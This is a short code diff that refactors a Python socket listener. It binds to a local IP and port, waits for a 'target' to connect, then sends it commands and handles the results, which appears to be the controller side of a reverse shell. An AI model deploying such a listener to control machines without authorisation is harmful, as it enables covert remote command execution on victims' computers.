@@ -21,20 +21,19 @@ def recieve():
             continue
 
 def target_communication(command):
-    while True:
-        send(command)
-        if command == "quit":
-            break
-        else:
-            result = recieve()
-            handlerfunction(result)
+    send(command)
+    result = recieve()
+    handlerfunction(result)
 
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(("192.168.1.11", 5555))
-print("Listening for incoming connections")
-sock.listen(5)
-target, ip = sock.accept()
-print("[+] Target connected from: ", str(ip))
+def establish_communication():
+    global target
+    global ip
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.bind(("192.168.1.11", 5555))
+    print("Listening for incoming connections")
+    sock.listen(5)
+    target, ip = sock.accept()
+    print("[+] Target connected from: ", str(ip))
 
 
